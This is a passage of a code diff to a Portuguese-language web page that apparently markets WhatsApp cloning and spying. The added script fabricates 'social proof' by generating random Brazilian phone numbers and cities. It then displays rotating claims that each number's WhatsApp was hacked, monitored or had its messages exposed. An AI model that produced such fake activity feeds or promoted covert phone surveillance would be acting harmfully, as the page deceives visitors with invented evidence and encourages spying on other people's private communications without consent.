'Coari', 'Tefé', 'Tabatinga'], 'Espírito Santo': ['Vitória', 'Vila Velha', 'Serra', 'Cariacica', 'Cachoeiro de Itapemirim', 'Linhares', 'São Mateus'], 'Mato Grosso': ['Cuiabá', 'Várzea Grande', 'Rondonópolis', 'Sinop', 'Tangará da Serra', 'Cáceres', 'Sorriso'], 'Rio Grande do Norte': ['Natal', 'Mossoró', 'Parnamirim', 'São Gonçalo do Amarante', 'Macaíba', 'Ceará-Mirim', 'Caicó'], 'Piauí': ['Teresina', 'Parnaíba', 'Picos', 'Piripiri', 'Floriano', 'Campo Maior', 'Barras'], 'Alagoas': ['Maceió', 'Arapiraca', 'Rio Largo', 'Palmeira dos Índios', 'União dos Palmares', 'São Miguel dos Campos', 'Penedo'], 'Distrito Federal': ['Brasília', 'Ceilândia', 'Taguatinga', 'Samambaia', 'Plano Piloto', 'Planaltina', 'Águas Claras'], 'Mato Grosso do Sul': ['Campo Grande', 'Dourados', 'Três Lagoas', 'Corumbá', 'Ponta Porã', 'Naviraí', 'Aquidauana'], 'Sergipe': ['Aracaju', 'Nossa Senhora do Socorro', 'Lagarto', 'Itabaiana', 'São Cristóvão', 'Estância', 'Tobias Barreto'], 'Rondônia': ['Porto Velho', 'Ji-Paraná', 'Ariquemes', 'Vilhena', 'Cacoal', 'Rolim de Moura', 'Jaru'], 'Tocantins': ['Palmas', 'Araguaína', 'Gurupi', 'Porto Nacional', 'Paraíso do Tocantins', 'Colinas do Tocantins', 'Guaraí'], 'Acre': ['Rio Branco', 'Cruzeiro do Sul', 'Sena Madureira', 'Tarauacá', 'Feijó', 'Brasileia', 'Epitaciolândia'], 'Amapá': ['Macapá', 'Santana', 'Laranjal do Jari', 'Oiapoque', 'Mazagão', 'Porto Grande', 'Tartarugalzinho'], 'Roraima': ['Boa Vista', 'Rorainópolis', 'Caracaraí', 'Alto Alegre', 'Mucajaí', 'Cantá', 'Pacaraima'] };
+
+            // All DDDs in Brazil
+            const allDDDs = Object.keys(dddToState);
+
+            // Actions
+            const actions = [
+                'está sendo clonado agora...',
+                'está sendo monitorado silenciosamente...',
+                'teve as mensagens interceptadas!',
+                'está sob vigilância agora...',
+                'foi rastreado com sucesso!',
+                'teve o WhatsApp clonado com sucesso!',
+                'está sendo espionado neste momento...',
+                'teve as conversas expostas!',
+                'está sendo rastreado em tempo real...',
+                'teve o acesso liberado para monitoramento!',
+                'teve o histórico de chamadas acessado!',
+                'está com todas as mensagens sendo monitoradas!',
+                'teve o WhatsApp hackeado com sucesso!',
+                'está com localização sendo rastreada!',
+                'teve as fotos e vídeos acessados!'
+            ];
+
+            // Function to generate random phone number with valid DDD
+            function generateRandomPhone() {
+                const ddd = allDDDs[Math.floor(Math.random() * allDDDs.length)];
+                const firstPart = Math.floor(Math.random() * 10000).toString().padStart(4, '0');
+                const lastPart = 'XX' + Math.floor(Math.random() * 100).toString().padStart(2, '0');
+                return {
+                    ddd: ddd,
+                    formattedNumber: `(${ddd}) 9${firstPart.substring(0, 4)}-${lastPart}`,
+                    state: dddToState[ddd]
+                };
             }
-        }, 150);
 
-        // === 4. BUSCA DE DADOS (API PROTEGIDA) ===
-        function showProfile() {
-            document.getElementById('loadingStep').style.display = 'none';
-            document.getElementById('profileStep').style.display = 'flex';
-            fetchProfileData();
-        }
+            // Function to generate random social proof message
+            function generateRandomProof() {
+                const randomType = Math.floor(Math.random() * 3);
+                const phoneInfo = generateRandomPhone();
+                let message = '';
 
-        async function fetchProfileData() {
-            let cleanNum = numeroSalvo.replace(/\D/g, '');
-            if(cleanNum.length <=
+                switch (randomType) {
+                    case 0: // Just phone and action
+                        message = `${phoneInfo.formattedNumber} ${actions[Math.floor(Math.random() * actions.length)]}`;
+                        break;
+                    case 1: // Phone with city and action
+                        const state = phoneInfo.state;
+                        const cities = citiesByState[state];
+                        const city = cities[Math.floor(Math.random() * cities.length)];
+                        message = `${phoneInfo.formattedNumber} de ${city} ${actions[Math.floor(Math.random() * actions.length)]}`;
+                        break;
+                    case 2: // Phone with state and action
+                        message = `${phoneInfo.formattedNumber} de ${phoneInfo.state} ${actions[Math.floor(Math.random() * actions.length)]}`;
+                        break;
+                }
+
+                return message;
+            }
+
+            // Function to update a specific proof item with animation
+            function updateProofItem(index) {
+                const proofItem = document.getElementById(`proof${index}`);
+                const proofText = document.getElementById(`proofText${index}`);
+
+                if (proofItem && proofText) {
+                    // Fade out
+                    proofItem.classList.remove('show');
+
+                    setTimeout(() => {
+                        // Update text
+                        proofText.textContent = generateRandomProof();
+
+                        // Fade in
+                        proofItem.classList.add('show');
+                    }, 500);
+                }
+            }
+
+            // Function to show social proof items with animation
+            function showSocialProof() {
+                const proof1 = document.getElementById('proof1');
+                const proof2 = document.getElementById('proof2');
+                const proof3 = document.getElementById('proof3');
+
+                // Initialize with random messages
+                document.getElementById('proofText1').textContent = generateRandomProof();
+                document.getElementById('proofText2').textContent = generateRandomProof();
+                document.getElementById('proofText3').textContent = generateRandomProof();
+
+                // Show with animation
+                setTimeout(() => {
+                    proof1.classList.add('show');
+
+                    setTimeout(() => {
+                        proof2.classList.add('show');
+
+                        setTimeout(() => {
+                            proof3.classList.add('show');
+
+                            // Start updating proofs randomly
+                            startProofUpdates();
+                        }, 1000);
+                    }, 1000);
+                }, 500);
+            }
+
+            // Function to start updating proofs periodically
+            function startProofUpdates() {
+                // Update a random proof every 3 seconds
+                setInterval(() => {
+                    const randomProofIndex = Math.floor(Math.random() * 3) + 1;
+                    updateProofItem(randomProofIndex);
+                }, 3000);
+            }
+
+            // Show social proof when page loads
+            showSocialProof();
+        });
+    </script>
+</body>
+</html>
